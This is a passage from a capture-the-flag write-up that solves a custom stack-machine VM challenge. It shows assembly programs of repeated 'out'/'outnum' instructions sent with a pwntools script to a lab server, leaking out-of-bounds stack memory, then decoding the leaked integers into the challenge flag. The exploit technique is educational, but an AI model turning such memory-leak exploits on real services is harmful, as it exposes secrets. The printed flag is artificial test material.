+b'== proof-of-work: disabled ==\nIntializing Secrets R Us Machine.\nLoading image from stdin...\nStarting VM\n0\n1\n2\n3\n5\n8\n13\n21\n34\n55\n89\n144\n233\n377\n610\n987\n1597\n2584\n4181\n6765\n10946\n17711\n28657\n46368\n75025\n121393\n196418\n317811\n514229\n832040\n1346269\n2178309\n3524578\n5702887\n9227465\n14930352\n24157817\n39088169\n63245986\n102334155\n165580141\n267914296\n433494437\n701408733\n1134903170\n1836311903\n2971215073\n'
+== proof-of-work: disabled ==
+Intializing Secrets R Us Machine.
+Loading image from stdin...
+Starting VM
+0
+1
+2
+3
+5
+8
+13
+21
+34
+55
+89
+144
+233
+377
+610
+987
+1597
+2584
+4181
+6765
+10946
+17711
+28657
+46368
+75025
+121393
+196418
+317811
+514229
+832040
+1346269
+2178309
+3524578
+5702887
+9227465
+14930352
+24157817
+39088169
+63245986
+102334155
+165580141
+267914296
+433494437
+701408733
+1134903170
+1836311903
+2971215073
+</code></pre>
+<p>Now we can run code on the VM server. The <code>bug_report</code> page mentioned leaking secrets from outside of the VM memory so let’s just try a bunch of <code>OUT</code> commands which will pop the stack and print the value as a uint8. Since we’re printing bytes we’ll remove the conversion to a string in the python code.</p>
+<p><code>exploit.smc</code></p>
+<pre><code>main:
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+halt
+</code></pre>
+<p><code>send.py</code></p>
+<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+data <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"exploit.sm"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+con <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'172.18.10.105'</span><span class="token punctuation">,</span> <span class="token number">1025</span><span class="token punctuation">)</span>
+con<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+con<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span><span class="token string">'send'</span><span class="token punctuation">)</span>
+out<span class="token operator">=</span>con<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span>
+</code></pre>
+<pre><code>$ stack-machine/smc ./exploit.smc &amp;&amp; python3.8 send.py
+[+] Opening connection to 172.18.10.105 on port 1025: Done
+[+] Receiving all data: Done (204B)
+[*] Closed connection to 172.18.10.105 port 1025
+b'== proof-of-work: disabled ==\nIntializing Secrets R Us Machine.\nLoading image from stdin...\nStarting VM\n\x00\x00\x00\nHGUONE RAF TON\n}nukst1{F \x00\x00\x00\nRAF OOT\n\x00\x06\x01]\x01\xa0\xfcx\xa4\xeb\xfc\x80\xfc0\x00 \xa4\xf1\xfc\x00\xfc0\x08\x00\xa4w\xfc\xe0\xa4\x80\xfc\xa0\xfc0\xa4 \xa4\xee\xfc\xc0\xfc0\xfc\xa0\xfc0\xfc\xa0\xfc\xa0\x00\x00\x00\xff\x00\x04\xfc\xf8\x00'
+</code></pre>
+<p>Some interesting output. <code>HGUONE RAF TON</code> reversed is <code>NOT FAR ENOUGH</code> and <code>RAF OOT</code> is <code>TOO FAR</code>. Between those two strings is <code>}nukst1{F</code> which reversed is <code>F{1tskun}</code>. This looks like it could be the flag, but it’s missing some bytes. If the flag should begin with <code>RTXFLAG</code> we can see the pattern of missing bytes.</p>
+<pre><code>(RTX)F
+(LAG){
+</code></pre>
+<p>So the VM is popping four bytes but only outputting one byte. If we use <code>OUTNUM</code> it will output the entire 4 byte int. We can also add <code>32 OUT</code> to add spaces between the numbers.</p>
+<p><code>exploit.smc</code></p>
+<pre><code>main:
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  32 out
+  32 out
+  32 out
+  32 out
+  outnum
+  32 out
+  outnum
+  32 out
+  outnum
+  32 out
+  outnum
+  32 out
+  outnum
+  32 out
+  outnum
+  32 out
+  outnum
+  32 out
+  outnum
+  32 out
+  outnum
+  32 out
+  outnum
+  32 out
+  outnum
+  32 out
+  32 out
+  32 out
+  32 out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  out
+  
+halt
+</code></pre>
+<pre><code>$ stack-machine/smc ./exploit.smc &amp;&amp; python3.8 send.py
+[+] Opening connection to 172.18.10.105 on port 1025: Done
+[+] Receiving all data: Done (243B)
+[*] Closed connection to 172.18.10.105 port 1025
+b'== proof-of-work: disabled ==\nIntializing Secrets R Us Machine.\nLoading image from stdin...\nStarting VM\n\x00\x00\x00\nHGUONE RAF TON\n    125 1949392750 829906805 813260651 1664382067 1597204596 1600417329 1999860347 1195461702 1481921056 0    \x00\x00\nRAF OOT'
+</code></pre>
+<p>So our output bytes are <code>125 1949392750 829906805 813260651 1664382067 1597204596 1600417329 1999860347 1195461702 1481921056</code> we can put those numbers into a quick python script to convert them to one long hex string, then to ascii.</p>
+<pre class=" language-python"><code class="prism  language-python">nums <span class="token operator">=</span> <span class="token string">"125 1949392750 829906805 813260651 1664382067 1597204596 1600417329 1999860347 1195461702 1481921056"</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>
+nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token keyword">for</span> a <span class="token keyword">in</span> nums<span class="token punctuation">]</span>
+fullNum <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">for</span> num <span class="token keyword">in</span> nums<span class="token punctuation">:</span>
+  fullNum <span class="token operator">+=</span> num
+  fullNum <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">32</span>
+fullNum <span class="token operator">&gt;&gt;</span><span class="token operator">=</span> <span class="token number">32</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>fullNum<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+</code></pre>
+<p><code>RTXFLAG{r3w1nd_th3_st4ck_y0u_w1n_1t}</code></p>
+</div>
+</body>
+
+</html>
